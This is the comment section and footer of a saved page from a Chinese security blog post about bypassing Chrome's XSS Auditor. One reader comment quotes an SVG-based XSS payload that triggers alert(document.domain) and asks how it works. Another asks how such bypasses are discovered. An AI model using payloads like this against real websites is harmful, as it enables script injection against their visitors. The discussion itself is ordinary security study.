+<p class="comment-meta">&lt;svg&gt;&lt;set href=#script attributeName=href to=data:,alert(document.domain) /&gt;&lt;script id=script src=foo&gt;&lt;/script&gt;请问Ph牛,这个set标签还有它的属性是自定义的还是?找不到资料哦这个</p>
+</div>
+</div>
+<div class="row" id="comment-2292">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">膜拜大神</a>
+<time datetime="2016年1月21日 16:10" itemprop="datePublished">
+                            2016 一月 21 16:10
+                        </time>
+<a href="javascript:reply_to('2292', '膜拜大神')">回复</a>
+</p>
+<p class="comment-meta">敢问大神，这种技巧咋挖的，包括sql注入的绕过</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="745d0d5d341b1d845f7ef1ece6431fa85699bd6e"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/745d0d5d341b1d845f7ef1ece6431fa85699bd6e"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="376">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="SWsHXV8xcpi7NoRe5Z6dRgUBDFwdWXkDqgNdLpkMDccwN3ftTgAXqUWGMJZlFr9N"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./浏览器安全一  Chrome XSS Auditor bypass  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
